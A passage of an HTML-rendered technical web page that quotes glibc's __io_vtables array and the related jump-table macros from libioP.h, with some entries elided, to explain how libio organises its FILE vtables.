style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, (</span><span style="--0:#005CC5;--1:#79B8FF">_IO_overflow_t</span><span style="--0:#24292E;--1:#E1E4E8">) _IO_wfile_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">51</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">52</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">53</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_wfile_jumps_maybe_mmap  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">54</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_WFILE_JUMPS_MAYBE_MMAP] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">55</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">56</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_new_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">57</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, (</span><span style="--0:#005CC5;--1:#79B8FF">_IO_overflow_t</span><span style="--0:#24292E;--1:#E1E4E8">) _IO_wfile_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">58</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">59</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">60</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_cookie_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">61</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_COOKIE_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">62</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">63</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">64</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, _IO_file_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">65</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">66</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">67</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_proc_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">68</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_PROC_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">69</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">70</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_new_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">71</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, _IO_new_file_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">72</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">73</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">74</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_mem_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">75</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_MEM_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">76</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">77</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_mem_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">78</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, _IO_str_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">79</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">80</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">81</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_wmem_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">82</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_WMEM_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">83</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">84</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_wmem_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">85</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, (</span><span style="--0:#005CC5;--1:#79B8FF">_IO_overflow_t</span><span style="--0:#24292E;--1:#E1E4E8">) _IO_wstr_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">86</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">87</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">88</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_PRINTF_BUFFER_AS_FILE_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">89</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">90</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">91</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, __printf_buffer_as_file_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">92</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">93</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">94</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_WPRINTF_BUFFER_AS_FILE_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">95</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">96</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, </span><span style="--0:#005CC5;--1:#79B8FF">NULL</span><span style="--0:#24292E;--1:#E1E4E8">),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">97</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, (</span><span style="--0:#005CC5;--1:#79B8FF">_IO_overflow_t</span><span style="--0:#24292E;--1:#E1E4E8">) __wprintf_buffer_as_file_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">98</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">99</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">100</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">101</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#if</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">SHLIB_COMPAT</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">libc</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#6F42C1;--1:#B392F0">GLIBC_2_0</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#6F42C1;--1:#B392F0">GLIBC_2_1</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">102</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_old_file_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">103</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_OLD_FILE_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">104</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">105</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_old_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">106</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, _IO_old_file_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">107</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">108</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">109</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/*  _IO_old_proc_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">110</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_OLD_PROC_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">111</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">112</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_old_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">113</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, _IO_old_file_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">114</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">115</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">116</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#endif</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">117</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">118</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#if</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">SHLIB_COMPAT</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#6F42C1;--1:#B392F0">libc</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#6F42C1;--1:#B392F0">GLIBC_2_0</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#6F42C1;--1:#B392F0">GLIBC_2_2</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">119</div></div><div class="code"><span class="indent"><span style="--0:#616972;--1:#99A0A6">  </span></span><span style="--0:#616972;--1:#99A0A6">/* _IO_old_cookie_jumps  */</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">120</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">[IO_OLD_COOKIED_JUMPS] </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">121</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">JUMP_INIT_DUMMY,</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">122</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (finish, _IO_file_finish),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">123</div></div><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">JUMP_INIT</span><span style="--0:#24292E;--1:#E1E4E8"> (overflow, _IO_file_overflow),</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">124</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">...SNIP...</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">125</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">  </span></span><span style="--0:#24292E;--1:#E1E4E8">},</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">126</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#endif</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">127</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">};</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="const struct _IO_jump_t __io_vtables[] attribute_relro ={  /* _IO_str_jumps  */  [IO_STR_JUMPS] =  {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_str_finish),    JUMP_INIT (overflow, _IO_str_overflow),    ...SNIP...  },  /* _IO_wstr_jumps  */  [IO_WSTR_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_wstr_finish),    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wstr_overflow),    ...SNIP...  },  /* _IO_file_jumps  */  [IO_FILE_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_file_finish),    JUMP_INIT (overflow, _IO_file_overflow),    ...SNIP...  },  /* _IO_file_jumps_mmap  */  [IO_FILE_JUMPS_MMAP] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_file_finish),    JUMP_INIT (overflow, _IO_file_overflow),    ...SNIP...  },  /* _IO_file_jumps_maybe_mmap  */  [IO_FILE_JUMPS_MAYBE_MMAP] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_file_finish),    JUMP_INIT (overflow, _IO_file_overflow),    ...SNIP...  },  /* _IO_wfile_jumps  */  [IO_WFILE_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_new_file_finish),    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wfile_overflow),    ...SNIP...  },  /* _IO_wfile_jumps_mmap  */  [IO_WFILE_JUMPS_MMAP] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_new_file_finish),    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wfile_overflow),    ...SNIP...  },  /* _IO_wfile_jumps_maybe_mmap  */  [IO_WFILE_JUMPS_MAYBE_MMAP] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_new_file_finish),    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wfile_overflow),    ...SNIP...  },  /* _IO_cookie_jumps  */  [IO_COOKIE_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_file_finish),    JUMP_INIT (overflow, _IO_file_overflow),    ...SNIP...  },  /* _IO_proc_jumps  */  [IO_PROC_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_new_file_finish),    JUMP_INIT (overflow, _IO_new_file_overflow),    ...SNIP...  },  /* _IO_mem_jumps  */  [IO_MEM_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_mem_finish),    JUMP_INIT (overflow, _IO_str_overflow),    ...SNIP...  },  /* _IO_wmem_jumps  */  [IO_WMEM_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_wmem_finish),    JUMP_INIT (overflow, (_IO_overflow_t) _IO_wstr_overflow),    ...SNIP...  },  [IO_PRINTF_BUFFER_AS_FILE_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, NULL),    JUMP_INIT (overflow, __printf_buffer_as_file_overflow),    ...SNIP...  },  [IO_WPRINTF_BUFFER_AS_FILE_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, NULL),    JUMP_INIT (overflow, (_IO_overflow_t) __wprintf_buffer_as_file_overflow),    ...SNIP...  },#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)  /* _IO_old_file_jumps  */  [IO_OLD_FILE_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_old_file_finish),    JUMP_INIT (overflow, _IO_old_file_overflow),    ...SNIP...  },  /*  _IO_old_proc_jumps  */  [IO_OLD_PROC_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_old_file_finish),    JUMP_INIT (overflow, _IO_old_file_overflow),    ...SNIP...  },#endif#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_2)  /* _IO_old_cookie_jumps  */  [IO_OLD_COOKIED_JUMPS] = {    JUMP_INIT_DUMMY,    JUMP_INIT (finish, _IO_file_finish),    JUMP_INIT (overflow, _IO_file_overflow),    ...SNIP...  },#endif};"><div></div></button></div></figure></div>
<p>It’s divided into parts for each category of jumps <a href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L509" rel="nofollow noreferrer noopener" target="_blank">here</a>.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:88ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">extern</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">const</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">struct</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">_IO_jump_t</span><span style="--0:#24292E;--1:#E1E4E8"> __io_vtables</span><span style="--0:#BF3441;--1:#F97583">[]</span><span style="--0:#24292E;--1:#E1E4E8"> attribute_hidden;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_str_jumps</span><span style="--0:#24292E;--1:#E1E4E8">                    (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_STR_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_wstr_jumps</span><span style="--0:#24292E;--1:#E1E4E8">                   (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_WSTR_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_file_jumps</span><span style="--0:#24292E;--1:#E1E4E8">                   (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_FILE_JUMPS])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">#define</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">_IO_file_jumps_mmap</span><span style="--0:#24292E;--1:#E1E4E8">              (</span><span style="--0:#AE4B07;--1:#FFAB70">__io_vtables</span><span style="--0:#24292E;--1:#E1E4E8">[IO_FILE_JUMPS_MMAP])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span 